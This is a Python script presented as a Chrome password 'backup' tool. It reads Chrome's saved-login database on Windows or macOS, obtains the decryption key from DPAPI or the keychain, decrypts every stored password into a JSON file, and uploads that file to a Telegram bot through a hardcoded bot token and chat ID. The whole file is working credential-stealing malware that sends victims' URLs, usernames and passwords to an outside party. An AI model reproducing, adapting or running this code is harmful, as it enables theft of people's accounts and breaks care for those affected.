import os
import json
import base64
import sqlite3
import shutil
import requests
import sys
import platform
from Crypto.Cipher import AES

if platform.system() == "Windows":
    import win32crypt
    import keyring

BOT_TOKEN = '7191024189:AAGZHq2c6kYiAArvwWgv0Xd4WPQko_1N2E8'
CHAT_ID = '6324121131'

def get_chrome_login_db():
    if platform.system() == "Windows":
        user_data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default'
    elif platform.system() == "Darwin":
        user_data_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
    else:
        raise Exception("Unsupported operating system")
    login_db = os.path.join(user_data_path, 'Login Data')
    return login_db

def get_encryption_key():
    if platform.system() == "Windows":
        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    elif platform.system() == "Darwin":
        local_state_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        key = keyring.get_password("Chrome Safe Storage", "Chrome")  # Using keyring to access Mac keychain
        if key:
            key = key.encode('utf-8')
        else:
            raise Exception("Failed to retrieve encryption key from keychain.")
    else:
        raise Exception("Unsupported operating system")
    return key

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ''

def backup_chrome_passwords(output_file='password_backup.json'):
    login_db = get_chrome_login_db()
    temp_login_db = login_db + '_temp'
    shutil.copyfile(login_db, temp_login_db)

    conn = sqlite3.connect(temp_login_db)
    cursor = conn.cursor()

    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    login_data = cursor.fetchall()

    key = get_encryption_key()

    passwords = []

    for url, username, encrypted_password in login_data:
        decrypted_password = decrypt_password(encrypted_password, key)
        passwords.append({
            'url': url,
            'username': username,
            'password': decrypted_password
        })

    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(passwords, f, indent=4)

    conn.close()
    os.remove(temp_login_db)

    print(f'Passwords have been backed up to {output_file}')
    return output_file

def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        payload = {
            'chat_id': CHAT_ID
        }
        files = {
            'document': f
        }
        response = requests.post(url, data=payload, files=files)
        if response.status_code == 200:
            print("Passwords sent to Telegram successfully.")
        else:
            print(f"Failed to send passwords to Telegram. Status code: {response.status_code}")
            print(f"Response: {response.text}")

if __name__ == '__main__':
    output_file = backup_chrome_passwords()
    send_to_telegram(output_file)
